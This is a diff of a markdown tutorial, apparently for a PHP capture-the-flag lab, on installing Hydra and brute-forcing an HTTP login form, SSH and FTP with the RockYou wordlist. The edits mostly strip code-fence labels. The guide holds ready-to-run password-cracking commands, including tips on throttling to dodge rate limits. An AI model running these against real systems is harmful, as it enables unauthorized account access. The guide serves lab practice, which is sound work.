@@ -157,7 +157,7 @@ What the Script Does:
 
     Permissions:
         Adjusts file permissions so Apache can serve the PHP pages properly.
-
+###
 
 Hydra is a powerful tool for brute-force password cracking. It can be used to attack many services like FTP, SSH, HTTP login forms, and more. In this guide, I'll walk you through the process of using Hydra to brute-force a login form, which is particularly useful in scenarios like the PHP CTF challenge mentioned earlier.
 Step-by-Step Guide to Using Hydra
@@ -167,26 +167,23 @@ If Hydra is not already installed on your system, you can install it by running 
 
     For Debian-based systems (Ubuntu, Kali, etc.):
 
-    bash
+   
 
 sudo apt-get update
 sudo apt-get install hydra -y
 
 For Fedora-based systems:
 
-bash
 
 sudo dnf install hydra -y
 
 For Arch-based systems:
 
-bash
 
     sudo pacman -S hydra
 
 You can verify the installation by running:
 
-bash
 
 hydra -h
 
@@ -195,13 +192,10 @@ This should display the help screen for Hydra.
 
 The basic syntax for Hydra is:
 
-bash
-
 hydra [options] service://target
 
 For brute-forcing web forms (like the CTF login page), the syntax is:
 
-bash
 
 hydra -l <username> -P <password list> <target> http-post-form "<path>:<post-data>:<success condition>"
 
@@ -232,8 +226,6 @@ Step 2: Run Hydra Against the Form
 
 To brute-force the password for the admin user using the RockYou password list, run the following Hydra command:
 
-bash
-
 hydra -l admin -P /var/www/html/rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!"
 
 Explanation of the command:
@@ -250,8 +242,6 @@ Step 3: Analyze Hydra’s Output
 
 As Hydra runs, it will try different passwords from the RockYou list. If the correct password is found, Hydra will show a result like this:
 
-css
-
 [80][http-post-form] host: localhost   login: admin   password: #####
 
 In this example, p##### is the correct password.
@@ -260,23 +250,17 @@ Brute-Forcing Multiple Usernames
 
 If you have a list of usernames, you can use -L to specify a username list:
 
-bash
-
 hydra -L usernames.txt -P rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!"
 
 Stopping After the First Valid Login
 
 By default, Hydra continues to brute-force after finding a valid login. To stop after the first successful attempt, add the -f flag:
 
-bash
-
 hydra -l admin -P rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!" -f
 
 Limiting Attempts (Max Tries)
 
 If you want to limit the number of password attempts (e.g., to avoid triggering rate-limiting):
-
-bash
 
 hydra -l admin -P rockyou.txt -t 4 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!"
 
@@ -294,15 +278,11 @@ SSH Bruteforce
 
 Hydra can also be used to brute-force SSH login:
 
-bash
-
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
 
 FTP Bruteforce
 
 For FTP login brute-force:
-
-bash
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://localhost
 
